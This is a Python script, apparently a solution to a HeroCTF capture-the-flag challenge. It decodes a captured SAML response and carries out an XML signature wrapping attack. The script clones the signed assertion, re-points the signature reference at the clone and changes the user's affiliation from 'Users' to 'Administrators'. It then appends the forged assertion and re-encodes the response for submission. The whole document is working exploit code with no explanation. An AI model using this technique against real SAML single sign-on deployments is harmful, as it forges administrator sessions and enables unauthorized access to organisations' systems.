from base64 import b64decode, b64encode
from lxml import etree

saml_response_raw = """
PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIHhtbG5zOnhzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYSIgSUQ9ImlkLTNjNTA1M2I1OTYwYTk5MzUwY2JmN2M2NzBjZGY3ZTJjYzk1ZTI1NjciIFZlcnNpb249IjIuMCIgSXNzdWVJbnN0YW50PSIyMDI1LTExLTI5VDExOjM2OjU0Ljk0NloiIERlc3RpbmF0aW9uPSJodHRwOi8vd2ViLmhlcm9jdGYuZnI6ODA4MC9zYW1sL2FjcyI+PHNhbWw6SXNzdWVyIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOm5hbWVpZC1mb3JtYXQ6ZW50aXR5Ij5odHRwOi8vd2ViLmhlcm9jdGYuZnI6ODA4MS9tZXRhZGF0YTwvc2FtbDpJc3N1ZXI+PHNhbWxwOlN0YXR1cz48c2FtbHA6U3RhdHVzQ29kZSBWYWx1ZT0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnN0YXR1czpTdWNjZXNzIi8+PC9zYW1scDpTdGF0dXM+PHNhbWw6QXNzZXJ0aW9uIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJpZC0wODI0MmFjNjQyYTJmMzg0OGE4MDY1MzgwMTU5MWM2NmZhOTA2MDRiIiBJc3N1ZUluc3RhbnQ9IjIwMjUtMTEtMjlUMTE6MzY6NTUuMDI5WiIgVmVyc2lvbj0iMi4wIj48c2FtbDpJc3N1ZXIgRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6bmFtZWlkLWZvcm1hdDplbnRpdHkiPmh0dHA6Ly93ZWIuaGVyb2N0Zi5mcjo4MDgxL21ldGFkYXRhPC9zYW1sOklzc3Vlcj48ZHM6U2lnbmF0dXJlIHhtbG5zOmRzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjIj48ZHM6U2lnbmVkSW5mbz48ZHM6Q2Fub25pY2FsaXphdGlvbk1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPjxkczpTaWduYXR1cmVNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjcnNhLXNoYTEiLz48ZHM6UmVmZXJlbmNlIFVSST0iI2lkLTA4MjQyYWM2NDJhMmYzODQ4YTgwNjUzODAxNTkxYzY2ZmE5MDYwNGIiPjxkczpUcmFuc2Zvcm1zPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjZW52ZWxvcGVkLXNpZ25hdHVyZSIvPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiLz48L2RzOlRyYW5zZm9ybXM+PGRzOkRpZ2VzdE1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNzaGExIi8+PGRzOkRpZ2VzdFZhbHVlPmZkY3MzZ3ZudSt5WjhGYXNlQkY5Skh2bXpXWT08L2RzOkRpZ2VzdFZhbHVlPjwvZHM6UmVmZXJlbmNlPjwvZHM6U2lnbmVkSW5mbz48ZHM6U2lnbmF0dXJlVmFsdWU+VEo0YlY3cS8xd05nTGFmSm03WFdHaUI1ejE2ZFp1dU5KNHF3anNQUWZ3UnEwaS9DZlJQdEpNL2dPMXg5YUNMQlYvZ3JXaDJoTWxjejcxV041ang0cURlay9vMVZYM3BHMEx2djZ5YVU4UDBjZFVPZ1g0aXBMQTVuRXQ1clZjSnN2M1VBM2FuY3RjU3l1NloxbHd6OWZxVk1XcXVPODRvUTJIQnRkWVVVY1B5Y1NQbitWUzNBdGp3TTJKcEJHZU9wSzloMFNiUHpPdkRrZzZ4WUhUWWNsd3V3QitnT3AyTXc1OFdWajRKZG04OVhOcGlEYTQvdFQreUk1c24yTmc0NWs1WURGODdIMmpVdkwxaFpldkhUMVJmVm5xNWd3UHVDeTIxd01GWWtyS3JQcnlOdEVCVjFhSDJFMDdCM3VzQUJHNDNEN3psbW55ZzZ3eEZZU2lLSDd3PT08L2RzOlNpZ25hdHVyZVZhbHVlPjxkczpLZXlJbmZvPjxkczpYNTA5RGF0YT48ZHM6WDUwOUNlcnRpZmljYXRlPk1JSUM2VENDQWRHZ0F3SUJBZ0lJSFpmRDdna3hKYWN3RFFZSktvWklodmNOQVFFTEJRQXdHVEVYTUJVR0ExVUVBeE1PYzJGdGJDMXBaSEF0Ykc5allXd3dIaGNOTWpVeE1USTNNVEV6TURBMldoY05Nall4TVRJM01USXpNREEyV2pBWk1SY3dGUVlEVlFRREV3NXpZVzFzTFdsa2NDMXNiMk5oYkRDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTUJrNnk0WmxlSGg4Wm01ZFNtZS83TWEyN3hCeEJ2RkpveCtURDBid2hrVjQyMGZEaVZpNXNBaEh0REJHOE9YdUhXZ1puODY4R3p1TTJmNWpXU0hxYVlWUTB3aXNZWGoxN2FJZHFPd1RpdnhrZm1kdFFyTmNrekxBeHRzVU1NSWZJOGpXK2I5SElLN2ZyeDd6aHlNbTAyYTZCQTJDR21SbURiZDBTdm8rR2RqUFJnSlFPWXFFTE9wQVVpYVRRT2YzemJqcWFmYWdOekp6OVlDdmNnYW15MmVBSWZZTkJsQkRlNk1GaUd1MjlVL3RhMTRSdTN3VjVGMElDVjNMMUUyWmIxNWVIQ0FRaFQ0OWhjZUJpTkxXWFhRV2ZYOVhwT2M5MTFhV0Zxd29VU2ZkQmdOYzB1QmZCSzFNQStiR3p6S0NLZ29UTHdwQ0RlY1ZPUWZOY0RkRUljQ0F3RUFBYU0xTURNd0RnWURWUjBQQVFIL0JBUURBZ1dnTUJNR0ExVWRKUVFNTUFvR0NDc0dBUVVGQndNQk1Bd0dBMVVkRXdFQi93UUNNQUF3RFFZSktvWklodmNOQVFFTEJRQURnZ0VCQUEvVWQ2OFl4cU00biszbWVFT0NKZlB3V2tkUDZZOHZHK3g5MWs1Nm9MQkZ3Z29Ic3EzYUdOcHdiRmd0R21QTzBYdFdSdDhBc0N0akQ3Q1hYZGY2M2pSMjZFNkdzUXNZK1Z0bkprcmNhN09sQ3k0ZkpkNHJQdURDL0pQUFdsYmMyOHFPVFVSS0s0dExMR3FuNDlGQmxYdkJsRENoNEluUVFyR3VBZ2lrSml5REVrNnF4ZVlwY01wcGd3Ym1GQ01lL0JjU24zWkFLUEpUZy9ucFU0U01lYmsxMDR2ZVBhcHlrNFJzNm5Fb01MUHVmZTFINnZ1bDAwenpZM0NFZC9xL1d4OUduaituNHVEMDR1Z0pLb2FtWUQwTnJHVlluTEQvY0x6QTE5Skd1ckpYL1FaZjRDSXZqTEJ1MkhLZmNuVkNSd2RMK3FLV3U3eEQwV2UwOHlQMnpjST08L2RzOlg1MDlDZXJ0aWZpY2F0ZT48L2RzOlg1MDlEYXRhPjwvZHM6S2V5SW5mbz48L2RzOlNpZ25hdHVyZT48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRCBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpuYW1laWQtZm9ybWF0OnRyYW5zaWVudCIgTmFtZVF1YWxpZmllcj0iaHR0cDovL3dlYi5oZXJvY3RmLmZyOjgwODEvbWV0YWRhdGEiIFNQTmFtZVF1YWxpZmllcj0iaHR0cDovL3dlYi5oZXJvY3RmLmZyOjgwODAvc2FtbC9tZXRhZGF0YSIvPjxzYW1sOlN1YmplY3RDb25maXJtYXRpb24gTWV0aG9kPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y206YmVhcmVyIj48c2FtbDpTdWJqZWN0Q29uZmlybWF0aW9uRGF0YSBBZGRyZXNzPSI5MS4xOTkuODQuMzI6MTE4NTkiIEluUmVzcG9uc2VUbz0iaWQtYjQ3MDg2MjI2NDRhYjE2M2M2OWQ5OTI4NWZlZDZjZDM2YWViYWQxZiIgTm90T25PckFmdGVyPSIyMDI1LTExLTI5VDExOjM4OjI0Ljk0NloiIFJlY2lwaWVudD0iaHR0cDovL3dlYi5oZXJvY3RmLmZyOjgwODAvc2FtbC9hY3MiLz48L3NhbWw6U3ViamVjdENvbmZpcm1hdGlvbj48L3NhbWw6U3ViamVjdD48c2FtbDpDb25kaXRpb25zIE5vdEJlZm9yZT0iMjAyNS0xMS0yOVQxMTozNjozOC41MzJaIiBOb3RPbk9yQWZ0ZXI9IjIwMjUtMTEtMjlUMTE6Mzg6MDguNTMyWiI+PHNhbWw6QXVkaWVuY2VSZXN0cmljdGlvbj48c2FtbDpBdWRpZW5jZT5odHRwOi8vd2ViLmhlcm9jdGYuZnI6ODA4MC9zYW1sL21ldGFkYXRhPC9zYW1sOkF1ZGllbmNlPjwvc2FtbDpBdWRpZW5jZVJlc3RyaWN0aW9uPjwvc2FtbDpDb25kaXRpb25zPjxzYW1sOkF1dGhuU3RhdGVtZW50IEF1dGhuSW5zdGFudD0iMjAyNS0xMS0yOVQxMTozNjo1NS4wMjlaIiBTZXNzaW9uSW5kZXg9IjQ4YmU4MTg4NGQzYjMzM2UxZjJkODAxODA1MzQzODk1ZTE1NmJiMTQ5YjQyZDQwYmNkMGJhMmExMzRmNTM4OTMiPjxzYW1sOlN1YmplY3RMb2NhbGl0eSBBZGRyZXNzPSI5MS4xOTkuODQuMzI6MTE4NTkiLz48c2FtbDpBdXRobkNvbnRleHQ+PHNhbWw6QXV0aG5Db250ZXh0Q2xhc3NSZWY+dXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFjOmNsYXNzZXM6UGFzc3dvcmRQcm90ZWN0ZWRUcmFuc3BvcnQ8L3NhbWw6QXV0aG5Db250ZXh0Q2xhc3NSZWY+PC9zYW1sOkF1dGhuQ29udGV4dD48L3NhbWw6QXV0aG5TdGF0ZW1lbnQ+PHNhbWw6QXR0cmlidXRlU3RhdGVtZW50PjxzYW1sOkF0dHJpYnV0ZSBGcmllbmRseU5hbWU9InVpZCIgTmFtZT0idXJuOm9pZDowLjkuMjM0Mi4xOTIwMDMwMC4xMDAuMS4xIiBOYW1lRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXR0cm5hbWUtZm9ybWF0OnVyaSI+PHNhbWw6QXR0cmlidXRlVmFsdWUgeG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSIgeHNpOnR5cGU9InhzOnN0cmluZyI+dXNlcjwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT48L3NhbWw6QXR0cmlidXRlPjxzYW1sOkF0dHJpYnV0ZSBGcmllbmRseU5hbWU9ImVkdVBlcnNvbkFmZmlsaWF0aW9uIiBOYW1lPSJ1cm46b2lkOjEuMy42LjEuNC4xLjU5MjMuMS4xLjEuMSIgTmFtZUZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmF0dHJuYW1lLWZvcm1hdDp1cmkiPjxzYW1sOkF0dHJpYnV0ZVZhbHVlIHhtbG5zOnhzaT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS9YTUxTY2hlbWEtaW5zdGFuY2UiIHhzaTp0eXBlPSJ4czpzdHJpbmciPlVzZXJzPC9zYW1sOkF0dHJpYnV0ZVZhbHVlPjwvc2FtbDpBdHRyaWJ1dGU+PC9zYW1sOkF0dHJpYnV0ZVN0YXRlbWVudD48L3NhbWw6QXNzZXJ0aW9uPjwvc2FtbHA6UmVzcG9uc2U+
"""
saml_response_xml = b64decode(saml_response_raw.strip()).decode()
print(saml_response_xml)

parser = etree.XMLParser(remove_blank_text=True)
tree = etree.fromstring(saml_response_xml, parser)
root = tree.getroottree()
ns = {
    "saml": "urn:oasis:names:tc:SAML:2.0:assertion",
    "ds": "http://www.w3.org/2000/09/xmldsig#"
}
assertion = root.findall(".//saml:Assertion", ns)[0]
assertion_cloned = etree.fromstring(etree.tostring(assertion))

sigval = assertion_cloned.findall(".//ds:Signature", ns)[0]
sigval.text = ""

assertion_cloned.set("ID", "id-xxx")
ref = assertion_cloned.findall(".//ds:Reference", ns)[0]
ref.set("URI", f"#id-xxx")

for attr in assertion_cloned.findall(".//saml:Attribute", ns):
    if attr.get("FriendlyName") == "eduPersonAffiliation":
        value = attr.findall("./saml:AttributeValue", ns)[0]
        value.text = "Administrators"

parent = assertion.getparent()
parent.append(assertion_cloned)

saml_response_xml_modified = etree.tostring(root)
saml_response_xml_modified_b64 = b64encode(saml_response_xml_modified).decode()
print(saml_response_xml_modified_b64)
